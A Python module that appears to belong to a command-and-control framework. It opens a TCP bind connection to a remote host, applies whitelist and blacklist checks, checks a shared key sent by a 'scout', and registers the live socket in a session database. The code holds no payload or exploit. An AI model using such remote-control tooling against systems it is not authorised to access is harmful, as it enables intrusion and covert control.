# GUI + CUI
# done
import library.modules.return_random_string as return_random_string
import library.modules.config as config
import library.modules.recv_all as recv_all
import socket
from datetime import datetime

config.main()
interface = config.interface
if interface == "GUI":
    from flask import jsonify
    import library.modules.log as log


def main(args):
    try:
        host = args.split(' ')[1]
        port = int(args.split(' ')[2])
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((host, port))
        if interface == "GUI":
            log.log_normal("Established a TCP connection to " + host + ":" + str(port))
        elif interface == "CUI":
            print(config.pos + 'Established a TCP connection to ' + host + ':' + str(port))
        if config.white_list:
            if host not in config.white_list:
                s.close()
                if interface == "GUI":
                    log.log_error("Connection aborted because " + str(host) + " is not in whitelist")
                    return jsonify(
                        {"output": "Fail", "output_message": "Connection was aborted because host was not in whitelist",
                         "data": ""})
                elif interface == "CUI":
                    print(config.neg + 'Connection was aborted because host was not in whitelist')
                    return
        elif config.black_list:
            if host in config.black_list:
                s.close()
                if interface == "GUI":
                    log.log_error("Connection aborted because " + str(host) + " is in blacklist")
                    return jsonify(
                        {"output": "Fail", "output_message": "Connection was aborted because host was in blacklist",
                         "data": ""})
                elif interface == "CUI":
                    print(config.neg + 'Connection was aborted because host was in blacklist')
                    return
        try:
            await_key = recv_all.main(s, 5)
        except (socket.timeout, socket.error):
            if interface == "GUI":
                log.log_error("Established connection to " + host + ":" + str(port) + " but no data received!")
                return jsonify({"output": "Fail", "output_message": "Established connection to " + host + ":" + str(
                    port) + " but no data received!", "data": ""})
            elif interface == "CUI":
                print(config.neg + 'Established connection to ' + host + ':' + str(port) + ' but no data received!')
                return
        s.settimeout(None)
        if await_key == config.key:
            if interface == "GUI":
                log.log_normal("Key from scout matches, connection is allowed")
            elif interface == "CUI":
                print(config.pos + 'Key from scout matches, connection is allowed')
            config.scout_database[str(config.incremented_scout_id)] = [s, host, str(port),
                                                                       host + ':' + str(port),
                                                                       return_random_string.main(5),
                                                                       datetime.now().strftime(
                                                                           '%Y-%m-%d %H:%M:%S'),
                                                                       'Bind']
            if interface == "GUI":
                log.log_normal("Entry added to database")
            elif interface == "CUI":
                print(config.inf + 'Entry added to database')

            config.incremented_scout_id += 1
            if interface == "GUI":
                toReturn = {}
                keys = list(config.scout_database.keys())
                keys.sort()
                for i in keys:
                    toReturn[i] = [i, config.scout_database[i][1], config.scout_database[i][2],
                                   config.scout_database[i][3], config.scout_database[i][4],
                                   config.scout_database[i][5], config.scout_database[i][6]]
                return jsonify({"output": "Success", "output_message": "Connection established", "data": toReturn})
        else:
            if interface == "GUI":
                log.log_error("Invalid key was supplied from scout, denying connection...")
                return jsonify(
                    {"output": "Fail", "output_message": "Invalid key was supplied from scout, denying connection...",
                     "data": ""})
            elif interface == "CUI":
                print(config.neg + 'Invalid key was supplied from scout, denying connection...')
            s.close()
    except (socket.timeout, socket.error):
        if interface == "GUI":
            log.log_error("Unable to establish bind TCP connection to " + host + ":" + str(port))
            return jsonify({"output": "Fail",
                            "output_message": "Unable to establish bind TCP connection to " + host + ":" + str(port),
                            "data": ""})
        elif interface == "CUI":
            print(config.neg + 'Unable to establish bind TCP connection to ' + host + ':' + str(port))
    except (IndexError, ValueError):
        if interface == "GUI":
            log.log_error("Please specify a valid hostname and port number")
            return jsonify(
                {"output": "Fail", "output_message": "Please specify a valid hostname and port number", "data": ""})
        elif interface == "CUI":
            print(config.neg + 'Please specify a valid hostname and port number')
